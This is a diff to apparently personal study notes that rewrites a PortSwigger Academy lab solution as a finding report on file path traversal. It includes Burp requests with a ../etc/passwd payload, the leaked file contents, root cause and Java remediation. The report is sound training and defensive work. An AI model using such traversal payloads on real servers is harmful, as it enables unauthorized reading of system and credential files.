@@ -112,16 +112,78 @@ When the response is binary (an image), I use Burp's "Render" tab to confirm I'm
 
 ## Labs
 
-### Lab: File path traversal, simple case
+> The writeup below uses a full finding-report format. It documents a
+> **PortSwigger Academy lab**, an authorized practice target, not a real
+> engagement. I write one or two labs this way to show the report format;
+> most labs stay in the compact notes style.
 
-**Apprentice · Solved**
+### Finding: File path traversal in product image loader
 
-[PortSwigger lab](https://portswigger.net/web-security/file-path-traversal/lab-simple)
+**Severity:** High (lab context) · **Category:** Path Traversal (OWASP A01: Broken Access Control) · **CWE-22**
+**Level:** Apprentice · **Status:** Solved
+**Affected endpoint:** `GET /image?filename=`
+**Target:** [PortSwigger lab: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple) (authorized practice environment)
 
-Goal: read `/etc/passwd`.
+#### Summary
 
-1. Intercepted the product image request in Burp Proxy.
-2. Replaced `filename=44.jpg` with `filename=../../../etc/passwd` and forwarded.
-3. Response body contained the contents of `/etc/passwd`.
+The product image loader passes the client-supplied `filename` value straight to a filesystem read with no validation, so any user can read arbitrary files from the server, including `/etc/passwd`.
 
-Takeaway: zero filtering on the filename param. The simplest possible case, useful as a baseline before testing the harder variants.
+#### Steps to reproduce
+
+1. Load a product page and intercept the image request in Burp Proxy. The app fetches images via a `filename` parameter:
+   ```http
+   GET /image?filename=44.jpg HTTP/2
+   Host: TARGET.web-security-academy.net
+   ```
+2. Send the request to Repeater and replace the filename with a traversal payload back to the filesystem root:
+   ```http
+   GET /image?filename=../../../../../../../../../../etc/passwd HTTP/2
+   Host: TARGET.web-security-academy.net
+   ```
+3. Send. The server returns `200 OK` with the contents of `/etc/passwd` in the response body:
+   ```
+   HTTP/2 200 OK
+   Content-Type: image/jpeg
+   Content-Length: 2316
+
+   root:x:0:0:root:/root:/bin/bash
+   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+   ...
+   peter:x:12001:12001::/home/peter:/bin/bash
+   carlos:x:12002:12002::/home/carlos:/bin/bash
+   ```
+
+(Padding the payload with extra `../` is harmless: once the path resolves to the filesystem root, further `../` sequences are no-ops, so an over-long chain always reaches root without needing to count directory depth.)
+
+#### Impact
+
+Any unauthenticated user can read any file the application's OS user can access: application source and config, back-end credentials, and sensitive OS files. Reading `/etc/passwd` confirms arbitrary file read and also enumerates local accounts (`peter`, `carlos`), useful as a foothold for password attacks against other services.
+
+#### Root cause
+
+User input flows into a filesystem API with no sanitization. Conceptually:
+
+```
+read(BASE_DIRECTORY + request.filename)   // "/var/www/images/" + "../../../etc/passwd"
+```
+
+The concatenated path is never canonicalized or checked to confirm it stays inside the base directory, so `../` sequences walk out of it.
+
+#### Remediation
+
+- Prefer not passing user input to filesystem APIs at all. Map an opaque ID to a known file server-side instead of accepting a path.
+- If a filename must be accepted, layer two checks:
+  1. Validate against an allowlist (or restrict to alphanumeric).
+  2. After resolving, confirm the canonical absolute path still starts with the base directory; reject otherwise.
+  ```java
+  File file = new File(BASE_DIRECTORY, userInput);
+  if (!file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
+    throw new SecurityException("path traversal");
+  }
+  ```
+- A Semgrep rule flagging user-controlled input reaching `new File(...)`, `open()`, `fs.readFile`, etc. without a canonicalization check catches this class in CI before it ships.
+
+#### References
+
+- PortSwigger topic: https://portswigger.net/web-security/file-path-traversal
+- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
